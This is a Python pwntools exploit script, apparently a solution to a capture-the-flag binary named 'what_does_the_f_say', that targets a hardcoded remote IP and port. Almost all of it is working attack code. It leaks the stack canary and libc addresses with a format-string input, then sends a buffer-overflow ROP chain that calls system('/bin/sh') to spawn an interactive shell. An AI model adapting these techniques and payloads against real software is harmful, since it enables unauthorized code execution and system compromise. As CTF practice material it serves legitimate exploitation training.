#!/usr/bin/env python3

from pwn import *

exe = ELF("./what_does_the_f_say_patched")

context.binary = exe

PUTS_GOT = p64(0x555555557f90) # Maybe is dynamic
PUTS_GOT_OFFSET = 0x56340adb4f90 - 0x56340adb274a
PUTS_PLT_OFFSET = 0x56340adb274a - 0x56340adb2030
PUTS_PLT = p64(0x555555555030)
POP_RDI_RET_OFFSET = 0x5555555558bb - 0x55555555574a
PUTS_OFFSET = 0x0000000000080e50;
XOR_RAX_RET_OFFSET = 0x00007f2096c2fbe9 - 0x56340adb274a;
MAIN_OFFSET = 0x000055ca59a6980a - 0x55ca59a6974a + 4;
RET_OFFSET = POP_RDI_RET_OFFSET+1;
ACTUAL_WARNING_RET_OFFSET = 0x55555555574a - 0x555555555656
DRINKS_MENU_OFFSET = 0x5628b484355d - 0x5628b484374a
WARNING_OFFSET = 0x559175b9974a - 0x559175b9944a;

# Local offset
# BIN_SH_OFFSET = 0x1d8678;
# SYSTEM_OFFSET = 0x0000000000050d70;
# LIBC_BASE_OFFSET = 0x29d90;

SYSTEM_OFFSET = 0x000000000004f4e0
BIN_SH_OFFSET = 0x1b40fa
LIBC_BASE_OFFSET = 0x21b97;

LEAK_LIBC_PUTS = False

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # gdb.attach(r)
    else:
        r = remote("159.65.20.166", 32513)

    return r

def start_and_leak_canary(r):
    # Stack canary is at %13$p
    print("Leaking stack canary...");
    for _ in range(0, 11):
        r.recvuntil(b"2. Space food\n");
        r.sendline(b"1")
        r.recvuntil(b"Deathstar(70.00 s.rocks)\n");
        r.sendline(b"1")

    r.recvuntil(b"2. Space food\n");
    r.sendline(b"1")
    r.recvuntil(b"Deathstar(70.00 s.rocks)\n");
    r.sendline(b"2")
    r.recvuntil(b"?\n");
    r.sendline(b"%13$p %15$p %25$p");
    data = r.recvline().strip();
    r.recvuntil(b"?\n")
    print("Received leak data: {}".format(data));
    data = data.decode('ascii').split(' ');
    canary = p64(int(data[0], 16));
    foxbar_addr = int(data[1], 16);
    libc_start = int(data[2], 16) - LIBC_BASE_OFFSET;
    print("Leaked canary: {} (endianess swapped) and foxbar: {}".format(canary, foxbar_addr));
    return (canary, foxbar_addr, libc_start)

def leak_puts_got_and_main(canary, foxbar_addr, r):
    payload = b"A" * 24;
    payload += canary
    payload += b"B" * 8;
    payload += p64(foxbar_addr + POP_RDI_RET_OFFSET)
    payload += p64(foxbar_addr + PUTS_GOT_OFFSET)
    payload += p64(foxbar_addr - PUTS_PLT_OFFSET)
    payload += p64(foxbar_addr + WARNING_OFFSET)

    r.sendline(payload);
    data = r.recvline().strip();
    data = u64(data.ljust(8, b"\x00"));
    print("Got data leak for libc base (puts): "+hex(data));
    return data;

def spawn_shell(canary, foxbar_addr, libc_base, r):
    payload = b"A" * 24;
    payload += canary;
    payload += b"B" * 8;
    payload += p64(foxbar_addr + POP_RDI_RET_OFFSET);
    payload += p64(libc_base + BIN_SH_OFFSET);
    payload += p64(foxbar_addr + POP_RDI_RET_OFFSET + 1);
    payload += p64(libc_base + SYSTEM_OFFSET);
    r.sendline(payload);


def main():
    r = conn()

    # good luck pwning :)
    # leak canary (maybe we also need to leak a return address for loop after rop chain)
    (canary, foxbar_addr, libc_start) = start_and_leak_canary(r);
    if LEAK_LIBC_PUTS:
        leak_puts_got_and_main(canary, foxbar_addr, r)
    else:
        print("Libc base: 0x{}".format(hex(libc_start)))
        print("Spawning shell...");
        spawn_shell(canary, foxbar_addr, libc_start, r);

    r.interactive()


if __name__ == "__main__":
    main()